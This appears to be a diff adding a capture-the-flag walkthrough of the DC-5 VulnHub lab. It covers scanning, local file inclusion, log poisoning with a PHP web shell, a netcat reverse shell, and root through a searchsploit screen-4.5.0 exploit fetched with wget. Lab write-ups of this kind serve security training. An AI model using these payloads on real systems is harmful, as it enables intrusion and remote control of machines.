@@ -1,0 +1,113 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">DC-5 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/dc-5-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-06-01T17:11:33+00:00">June 1, 2019</time><time class="updated" datetime="2025-06-10T20:11:38+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to take another boot2root challenge known as “DC-5”. The credit for making this VM machine goes to “DCAU” and it is another boot2root challenge in which our goal is to get root access to complete the challenge. You can download it from <a style="color: #000000;" href="https://www.vulnhub.com/entry/dc-5,314/">here</a>.</span></p>
+<p><span style="color: #000000;"><strong>Security Level</strong>: Medium</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Methodology</strong></span></h3>
+<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Discovering Targets IP</span></li>
+<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Surfing HTTP service port</span></li>
+<li><span style="color: #000000;">Abusing CMS using LFI </span></li>
+<li><span style="color: #000000;">Checking Ngnix Access Logs</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Exploiting LFI vulnerability using Burpsuite</span></li>
+<li><span style="color: #000000;">Using Netcat to get the reverse shell</span></li>
+<li><span style="color: #000000;">Spawning a tty shell</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Checking SUID binaries</span></li>
+<li><span style="color: #000000;">Kernel Privilege Escalation</span></li>
+<li><span style="color: #000000;">Accessing root directory</span></li>
+<li><span style="color: #000000;">Capture the flag</span></li>
+</ul>
+<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Scanning </strong></span></h3>
+<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DebhdB8knr0/XPKoMWq3Y6I/AAAAAAAAeoM/z83l6KjjQr0TecP7DDmmz0TROUfG9IBcgCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">We found our Targets IP Address 192.168.1.108. Our next step is to scan our targets IP Address with nmap.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.108</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZQgQDFV7l2Q/XPKoQGacjzI/AAAAAAAAeow/cId2nWlibaMezYWbFaKUQ7y3hDznaagKACLcBGAs/s1600/2.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">From nmap result we found HTTP service is running on port 80. So, we browsed the Targets IP Address in the browser.  Let’s explore the webpage for hints.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Bzf1-nnq0GE/XPKoSPgDeoI/AAAAAAAAepE/dgli8Lhj9K0vQqDAVIUZvP1LI9quSlZJgCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">While exploring the page, we found a contact form which seems interesting. We filled the form and submitted it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yYAt8h647Xg/XPKoStDFUhI/AAAAAAAAepM/BDo4HsbLwaIRT-u_65akoyuIqowGigc-ACLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">After submitting the form we were redirected to Thankyou.php page, we notice the Copyright says 2019.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JK1a-wapHk8/XPKoSm1WldI/AAAAAAAAepI/u7tjPOe9YIEoKLmVt_VkK1yfiPlfoR6ngCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">On refreshing the page multiple times, we notice changes in Copyright year i.e 2020 AND 2019 where it was called on thankyou.php file. I try to fuzz this URL but it was not that much easier and after spending some time I test for LFI.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ul57HcTju-U/XPKoSynnrII/AAAAAAAAepQ/x58pwZyhSy8o5eJ5j_0kMJda4u85CJAMQCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Therefore, I Quickly checked for LFI Vulnerability by obtaining the /etc/passwd file as shown below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BdhIW2MEXbI/XPKoTZLf5II/AAAAAAAAepU/rZ2SdTzG1UMGedlY0ouyiaKyz0XQCMjkQCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">After going through various files path, we found the nginx access log file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cPGKCEp3vv0/XPKoThR9fhI/AAAAAAAAepY/Rms0uQBtWOU2VxTISru-n0nf7QLxeAD7QCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Let’s capture the request of the Nginx Access log file using Burpsuite. Here we will be using LFI to exploit apache access log.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ytjchWTphSI/XPKoMTHOGaI/AAAAAAAAeoI/gf_AmDmynJ4t38plF9EnlIC7x-XDPImpACLcBGAs/s1600/10.png"/></span></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Exploiting LFI</span> </strong></span></h3>
+<p><span style="color: #000000;">In place of the file path, we have injected a Code to get the command line access by making a GET request to the Server.</span></p>
+<pre class="lang:default decode:true">&lt;?php system($_GET['cmd']) ?&gt;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LxUSoJLqTaQ/XPKoMUpJ6sI/AAAAAAAAeoQ/Y6Bimr6X0t00sT6vOAeW1VdLkbsYi4nhACLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">To verify that it is working or not, we have added a new parameter to the URL i.e <strong>&amp;cmd=id. </strong>Therefore from the output, it confirms we have successfully executed the command on the server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rw2xS0y0mU4/XPKoNF7YSEI/AAAAAAAAeoU/yW7NUDdy8Nsk46YI5SolK9NDDJMT44yggCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Using netcat shell with cmd. This will give us a reverse shell over our netcat listener which we have executed alongside.</span></p>
+<pre class="lang:default decode:true">nc -e /bin/bash 192.168.1.110 1234</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7Ymab-CC7KE/XPKoNFeEsnI/AAAAAAAAeoY/9JQCjSGSIWEOLPJ4n5vq_cLU5J_WUqQHwCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Booyah!! We have got the reverse shell. To get the proper shell, we have Spawn the Python TTY Shell. Without wasting much time, I looked for SUID enabled binaries and here <strong>/bin/screen-4.5.0</strong> looks interesting.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-j-eYknTIN44/XPKoNel3nJI/AAAAAAAAeoc/euF43vDO6IAzstRoEd6g9iJBilCuF8oCACLcBGAs/s1600/14.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">It quickly strikes us to look for this term screen-4.5.0 using searchsploit. And what we got was a LOCAL PRIVILEGE ESCALATION Exploit. We have copied the exploit on our system.</span></p>
+<pre class="lang:default decode:true">searchsploit screen 4.5.0
+searchsploit -m 41154</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gNls9-TOP78/XPKoN7s9xyI/AAAAAAAAeog/SWSj_gsLmN4Zi7KoZn9qKuYn9ZzYHr6zgCLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">When we didn’t find any appropriate method to execute this shell script for post exploitation then I go with manual compilation and review its code using cat command.</span></p>
+<pre class="lang:default decode:true">cat 41154.sh</pre>
+<p><span style="color: #000000;">If you will notice the following code then you will observe this script is written in C language and we have divided it into three part for manual compilation.</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Copy Red</strong> highlighted the code and past it in a text document and save it as <strong>libhax.c</strong></span></li>
+<li><span style="color: #000000;"><strong>Copy</strong> <b>Yellow</b> highlighted the code and past it in a text document and save it as <strong>rootshell</strong>.<strong>c</strong></span></li>
+</ul>
+<p><span style="color: #000000;">At last <strong>copy remaining</strong> code (<strong>Green</strong>) and past it in a text document and save it as <strong>41154.sh</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DCL1YaCuUXk/XPKoOpEDQOI/AAAAAAAAeok/rO0HroChlcIYWVpXmVueSyXj5LJhsyv3ACLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">From given below image you can see I have pasted the above copied code inside <b>libhax.c</b></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vzduxwidkPw/XPKoO3LYvvI/AAAAAAAAeoo/KleJ9WV9JfMhQc-a5hulgr1mlj9d69PTgCLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">From given below image you can see I have pasted above copied inside <b>rootshell.c</b></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eoM1w3j1M0k/XPKoPQLVtwI/AAAAAAAAeos/-7At22GCwe0aT6P9LywjaI7wZJ8DYbbRQCLcBGAs/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">From given below image you can see I have pasted above remaining copied inside <strong>41154.sh</strong> and save all three text document inside the /etc directory on our system.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1T0Y0-xTDv0/XPKoQ-00chI/AAAAAAAAeo0/9R8p7N6kzP80uVZinRB0VQtUutkmGIfGwCLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">Let’s compile our C program file manually in our local system using gcc. Similarly, compile rootshell.c file.</span></p>
+<pre class="lang:default decode:true">gcc -fPIC -shared -ldl -o libhax.so libhax.c
+gcc -o rootshell rootshell.c</pre>
+<p><span style="color: #000000;">Since we have stored all the files in a folder shell, now let’s upload them into the target’s system using python server.</span></p>
+<pre class="lang:default decode:true">python -m SimpleHTTPServer</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WZHvL2lMt2o/XPKoROI6W1I/AAAAAAAAeo8/31O84kOnYXEXi9hUXCZQb6uLA9Y1OnZzACLcBGAs/s1600/22.png"/></span></p>
+<p><span style="color: #000000;">Let’s just downloading all the files inside the /tmp folder of the previous reverse shell.</span></p>
+<pre class="lang:default decode:true">wget http://192.168.1.110:8000/41154.sh
+wget http://192.168.1.110:8000/libhax.so
+wget http://192.168.1.110:8000/rootshell</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-U8WhGlgGTt4/XPKoRCo6vrI/AAAAAAAAeo4/JU1DscuvDJ0aYvk28GpDXP77ph2XxnyNQCLcBGAs/s1600/23.png"/></span></p>
+<p><span style="color: #000000;">After making the file executable and running, we have got the root access. One final thing to do is to read our FINAL FLAG.</span></p>
+<pre class="lang:default decode:true">chmod 777 41154.sh
+./41154.sh
+id
+cd /root
+ls
+cat thisistheflag.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-K9TsOgXmFCs/XPKoRehfH-I/AAAAAAAAepA/TjQkNtpYww0JHoVE9SrhkWa0Hvs_Cp2AwCLcBGAs/s1600/24.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author:</strong> Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing his 3 years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/"><strong>Here</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
